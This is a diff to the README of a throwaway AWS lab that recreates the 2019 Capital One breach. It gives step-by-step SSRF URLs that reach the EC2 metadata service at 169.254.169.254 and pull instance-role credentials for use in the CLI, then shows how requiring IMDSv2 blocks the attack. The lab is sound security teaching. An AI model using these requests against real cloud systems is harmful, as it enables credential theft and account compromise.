@@ -2,10 +2,13 @@
 
 Disposable AWS lab that reconstructs the **2019 Capital One** entry:
 
-1. A **WAF on EC2** (Apache httpd reverse proxy, ModSecurity if the package is there).
-2. A **misconfiguration**: the WAF proxies `/latest/` to `http://169.254.169.254/latest/` — SSRF to IMDS.
-3. **IMDSv1** (`HttpTokens=optional`).
-4. Instance role **`capone-WAF-Role`** that can list buckets and read one private object.
+1. An internet-facing app on EC2 that **GETs whatever `?url=` says** (SSRF).
+2. **IMDSv1** (`HttpTokens=optional`).
+3. Instance role **`capone-imds-lab-instance`** that can list buckets and read one private object.
+
+The attack URL is the same as the blog:
+
+`http://<PUBLIC_IP>/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/`
 
 **Do not run this in production. Use a throwaway account. Tear it down when you are done. Port 80 is open.**
 
@@ -47,15 +50,19 @@ export AWS_REGION=us-east-1
 
 ## What you do
 
-WAF home: `http://<PUBLIC_IP>/`
-
-In the **browser address bar** (the WAF reverse-proxies this path to IMDS):
+In the **browser address bar**:
 
 ```
-http://<PUBLIC_IP>/latest/meta-data/iam/security-credentials/
+http://<PUBLIC_IP>/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
 ```
 
-Then append the role name (`capone-WAF-Role`). The body is the instance-role JSON.
+Then append the role name:
+
+```
+http://<PUBLIC_IP>/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/capone-imds-lab-instance
+```
+
+The body is the instance-role JSON.
 
 Put those keys in a CLI profile (session token is required for `ASIA` keys):
 
@@ -73,7 +80,7 @@ Require IMDSv2 (use the **same** `AWS_PROFILE` you used for setup):
 aws ec2 modify-instance-metadata-options --instance-id <id> --http-tokens required
 ```
 
-Reload the same `/latest/` URLs. Expect **401**.
+Reload the same `/fetch?url=` URLs. Expect **401**.
 
 ## Destroy
 
